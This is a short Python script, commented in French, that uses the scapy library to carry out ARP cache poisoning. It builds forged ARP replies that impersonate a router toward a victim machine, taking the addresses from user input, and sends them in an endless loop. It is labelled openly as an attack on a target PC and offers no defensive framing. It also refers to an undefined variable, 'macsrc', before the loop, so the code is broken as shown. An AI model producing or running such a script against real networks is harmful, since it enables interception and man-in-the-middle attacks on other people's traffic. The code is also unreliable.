from scapy.all import *

#Attaque vers pc Cible
eth = Ether(type = 0x0806)

pac = ARP()
pac.hwlen = 6 #taille address mac
pac.plen = 4 #taille address IPv4 
pac.op = 2 #code d'operation
pac.psrc =  input('entrez l adresse IP du routeur : ') #IP source (nous) en se faisant passer pour le routeur
pac.pdst = input('entrez l adresse IP du destinataire : ') #IP destination (victime)
pac.hwsrc = input('entrez l adresse MAC de source : ') #MAC src (nous)
pac.hwdst = input('entrez l adresse MAC de destination :    ') #MAC dst (victime)

attaque = eth / pac


print(macsrc, type(macsrc))

while True:
    sendp(attaque)